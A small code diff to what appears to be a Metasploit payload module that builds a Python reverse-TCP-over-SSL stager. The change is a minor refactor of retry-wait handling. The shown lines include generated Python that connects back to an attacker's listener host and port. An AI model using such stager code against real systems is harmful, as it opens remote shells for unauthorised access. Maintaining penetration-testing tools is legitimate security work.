@@ -31,7 +31,7 @@ module Payload::Python::ReverseTcpSsl
       port:        datastore['LPORT'],
       host:        datastore['LHOST'],
       retry_count: datastore['StagerRetryCount'],
-      retry_wait:  datastore['StagerRetryWait'],
+      retry_wait:  datastore['StagerRetryWait']
     }
 
     generate_reverse_tcp_ssl(conf)
@@ -51,7 +51,7 @@ module Payload::Python::ReverseTcpSsl
 
   def generate_reverse_tcp_ssl(opts={})
     # Set up the socket
-    cmd  = "import ssl,socket,struct#{datastore['StagerRetryWait'].to_i > 0 ? ',time' : ''}\n"
+    cmd  = "import ssl,socket,struct#{opts[:retry_wait].to_i > 0 ? ',time' : ''}\n"
     if opts[:retry_wait].blank? # do not retry at all (old style)
       cmd << "so=socket.socket(2,1)\n" # socket.AF_INET = 2
       cmd << "so.connect(('#{opts[:host]}',#{opts[:port]}))\n"
